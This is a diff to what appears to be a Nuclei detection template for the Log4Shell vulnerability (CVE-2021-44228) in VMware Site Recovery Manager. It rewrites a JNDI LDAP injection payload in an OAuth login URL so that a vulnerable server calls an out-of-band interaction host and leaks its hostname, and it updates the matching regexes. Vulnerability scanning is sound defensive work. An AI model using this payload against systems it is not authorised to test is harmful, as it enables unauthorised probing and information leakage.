@@ -16,14 +16,19 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
+    max-request: 1
     shodan-query: title:"VMware Site Recovery Manager"
     verified: "true"
   tags: cve,cve2021,jndi,log4j,rce,oast,vmware,siterecovery,kev
 
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
 http:
   - method: GET
     path:
-      - '{{BaseURL}}/dr/authentication/oauth2/oauth2login?error=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D'
+      - '{{BaseURL}}/dr/authentication/oauth2/oauth2login?error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.{{interactsh-url}}%7D'
 
     matchers-condition: and
     matchers:
@@ -35,7 +40,7 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
       - type: word
         part: body
@@ -49,6 +54,12 @@ http:
 
       - type: regex
         part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
+      - type: regex
+        part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
